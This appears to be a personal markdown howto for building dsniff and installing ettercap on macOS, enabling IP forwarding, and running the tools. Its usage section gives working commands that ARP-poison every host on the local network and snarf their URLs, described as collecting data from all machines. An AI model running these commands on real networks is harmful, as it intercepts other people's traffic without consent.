# Dsniff/Ettercap on Mac 


## Installation 

`brew install dnsiff` fails due to some issue with Berkley DB.
Hence I compilied a tweaked version of (Dug Song's dsniff tools)[https://monkey.org/~dugsong/dsniff/] ,

```sh
git clone https://github.com/ggreer/dsniff.git
```

Made Sure I had all the dependencies are installed by doing :
```sh
brew install homebrew/dupes/libpcap
brew install berkeley-db libnet libnids openssl
```

Now I installed it by following commands :
```sh
./configure \
  --with-libpcap=/usr/local/opt/libpcap \
  --with-openssl=/usr/local/opt/openssl \
  --with-libnet=/usr/local/opt/libnet \
  --with-libnids=/usr/local/opt/libnids \
  --with-x

make
make install
```

Verifying the installation :

```sh
arpspoof
> Version: 2.4
> Usage: arpspoof [-i interface] [-t target] host
```


## IP Forwarding on Mac

Original Value is 0 for net.inet.ip.forwarding/net.inet.ip.fw.enable amke it to 1

```sh
sudo sysctl -w net.inet.ip.forwarding=1
> Password:
> net.inet.ip.forwarding: 0 -> 1
```

```sh
sudo sysctl -w net.inet.ip.fw.enable=1
Password:
sysctl: unknown oid 'net.inet.ip.fw.enable'
```



## Ettercap

```sh
brew install ettercap
```



# Useage : 

To collect data form all the machines in the local network,

```sh
sudo ettercap -E -T -i en1 -Q -M arp /// ///
```

```sh
sudo urlsnarf -i en1
```
Note : the above command without before running ettercap command will give data form localhost machine only

We can check the the list of machines on local network as :

```sh
arp -a
```


# Reference :

* https://github.com/ggreer/dsniff
* http://hackvault.blogspot.in/2014/08/dsniff-and-arpspoof-on-mac.html
